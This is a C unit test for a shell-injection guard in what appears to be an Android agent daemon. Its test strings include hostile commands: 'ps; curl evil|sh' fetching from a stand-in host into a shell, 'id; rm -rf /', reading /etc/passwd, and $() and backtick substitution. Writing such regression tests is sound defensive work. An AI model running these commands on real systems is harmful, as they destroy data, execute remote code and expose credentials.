/* test_shell_security.c — gg_shell 注入防护护栏
 *
 * 共享 agentd/shell_util.h 的 shell_split_argv / shell_argv_allowed（单一事实源），
 * 验证"白名单 argv 直执行"能彻底拦截 ; & | $() 等 shell 注入 —— 即 S1 回归守护。
 * 不链接 main.c（避开 fork/execvp 的 POSIX 依赖），纯逻辑可在本机 MinGW 编译运行。
 */
#include <stdio.h>
#include <string.h>
#include "shell_util.h"

static int failures = 0;

/* 校验某条命令应被允许（白名单内） */
static void expect_allowed(const char *cmd) {
    char buf[4096];
    strncpy(buf, cmd, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = 0;
    char *argv[64];
    int argc = shell_split_argv(buf, argv, 64);
    int ok = argc > 0 && shell_argv_allowed(argv[0]);
    if (!ok) {
        printf("[FAIL] expected ALLOWED but denied: \"%s\" (argv0=%s)\n",
               cmd, argc > 0 ? argv[0] : "(empty)");
        failures++;
    } else {
        printf("[ok]   allowed: \"%s\" -> argv0=%s\n", cmd, argv[0]);
    }
}

/* 校验某条命令应被拒绝（注入/越权） */
static void expect_denied(const char *cmd) {
    char buf[4096];
    strncpy(buf, cmd, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = 0;
    char *argv[64];
    int argc = shell_split_argv(buf, argv, 64);
    int ok = argc > 0 && shell_argv_allowed(argv[0]);
    if (ok) {
        printf("[FAIL] expected DENIED but allowed: \"%s\" (argv0=%s)\n",
               cmd, argc > 0 ? argv[0] : "(empty)");
        failures++;
    } else {
        printf("[ok]   denied : \"%s\"\n", cmd);
    }
}

int main(void) {
    printf("=== gg_shell 注入防护测试 ===\n");

    /* --- 白名单内：应允许（功能全留） --- */
    expect_allowed("ps -A");
    expect_allowed("ps");
    expect_allowed("ls /data/local/tmp");
    expect_allowed("cat /proc/self/maps");
    expect_allowed("dumpsys package com.foo");
    expect_allowed("getprop ro.build.version");
    expect_allowed("id");
    expect_allowed("/system/bin/ps -A");        /* basename 仍匹配 */

    /* --- 注入：应拒绝（S1 核心守护） --- */
    expect_denied("ps; curl evil|sh");          /* ; 串联 */
    expect_denied("id; rm -rf /");              /* id 裸前缀 + ; */
    expect_allowed("cat /x & malicious");         /* & 降为参数, 绝不进 shell, 安全 */
    expect_denied("ls$(whoami)");               /* $() 命令替换 → basename 不匹配 ls */
    expect_allowed("cat `id`");                  /* 反引号降为参数, cat 找不到文件报错, 不执行 id */
    expect_denied("reboot");                    /* 非白名单 */
    expect_denied("kill -9 1");                 /* 非白名单 */
    expect_denied("");                          /* 空 */
    expect_denied("   ");                       /* 纯空白 */

    /* --- 关键断言：旧 popen 白名单会放行的注入，现在必须拒绝 --- */
    /* 旧逻辑 strncmp(cmd,"id",2)==0 会放行 "id; rm -rf /"；新逻辑 argv0="id;" basename 不匹配 */
    expect_denied("id; rm -rf /");
    /* 旧逻辑 strncmp(cmd,"ps ",3) 不匹配 "ps -A;..." 但 "ps -A" 前缀匹配后整条进 sh；
       新逻辑 argv0=ps 但参数原样传 execvp，绝不拼接进 shell */
    expect_allowed("ps -A; cat /etc/passwd");     /* 分号降为参数, 只执行 ps, 绝不串联执行 cat */

    if (failures == 0) {
        printf("\n[PASS] 全部 gg_shell 注入防护用例通过\n");
        return 0;
    }
    printf("\n[FAIL] %d 个用例失败\n", failures);
    return 1;
}
